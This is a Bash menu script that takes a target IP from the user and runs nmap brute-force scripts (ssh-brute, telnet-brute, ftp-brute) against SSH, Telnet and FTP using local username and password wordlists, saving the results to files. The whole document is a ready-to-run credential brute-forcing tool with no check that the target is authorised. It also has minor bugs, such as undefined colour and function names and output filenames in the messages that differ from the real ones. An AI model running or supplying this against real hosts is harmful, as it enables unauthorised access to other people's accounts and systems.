#!/bin/bash

#Bash menu script
#get IP address from user input
# read IP address

echo " enter ip address: "
read ip_add

echo " you entered this IP: "
echo $ip_add

#path
MYPATH=/home/Desktop/scripts
echo "The directory is: "
echo $MYPATH


#ip_add=$(IP_add)

function SSH(){
    echo ""
    echo "you choose SSH"
    nmap -v --script ssh-brute -p22 $ip_add --script-args userdb=$MYPATH/users.txt,passdb=$MYPATH/password-lists-update.txt -oN $MYPATH/SSH-Brute-nmap.txt
    echo "The output file is saved under home/Desktop/scripts/Bruteforce-ssh-nmap.txt"
}

function Telnet(){
    echo ""
    echo "you choose Telnet"
    nmap -v --script telnet-brute -p23 $ip_add --script-args userdb=$MYPATH/users.txt,passdb=$MYPATH/password-lists-update.txt -oN $MYPATH/Telnet-Brute-nmap.txt
    echo "The output file is saved under home/Desktop/scripts/Bruteforce-telnet-nmap.txt"
}

function FTP(){
    echo ""
    echo "you choose FTP"
    nmap -v --script ftp-brute -p21 $ip_add --script-args userdb=$MYPATH/users.txt,passdb=$MYPATH/password-lists-update.txt -oN $MYPATH/FTP-Brute-nmap.txt
    echo "The output file is saved under home/Desktop/scripts/FTP-Brute-nmap.txt"
}



function all_checks(){
    SSH
    Telnet
    #FTP
}

##
# Color Variables
##
green='\e[32m'
blue='\e[34m'
#clear='\e[0m"

##
# Color Functions

##

ColorGreen(){
    echo -ne $green$1$clear
}

ColorBlue(){
    echo -ne $blue$1$clear
}

menu(){

    echo -ne "
    Choose Option Menu
    $(ColorGreen '1)') SSH
    $(ColorGreen '2)') Telnet
    $(ColorGreen '3)') FTP
    $(ColorGreen '4)') Check All
    $(ColorGreen '0)') Exit
    $(ColorBlue 'Choose an option:')"

    read a
    case $a in
        1) SSH ; menu ;;
	2) Telnet ; menu ;;
	3) FTP ; menu ;;
	4) all_checks ; menu ;;
    0) exit 0 ;;
    *) echo -e $red"Wrong option."$clear;WrongCommand;;
    esac
}

#Call the menu function
menu

